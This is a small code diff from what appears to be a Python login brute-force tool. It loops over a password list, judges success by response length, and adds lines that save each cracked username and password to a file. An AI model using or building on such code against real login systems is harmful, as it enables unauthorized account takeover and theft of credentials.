@@ -37,5 +37,8 @@ for password in passwordList:
         #Check content length, usually 20k or so indicates failure, 2k or so indicates success. Need a better validation method.
         if(len(attackRequest.text) < 3000):
             print("SUCCESS! USERNAME: " + user + "\t PASSWORD: " + password)
+            #Write valid credentials to output file
+            with open("output.txt", "a") as outputFile:
+                outputFile.write("SUCCESS:"+user+":"+password+"\n")
         else:
             print("LOGIN Attempt Failed " + user + "\t PASSWORD: " + password)
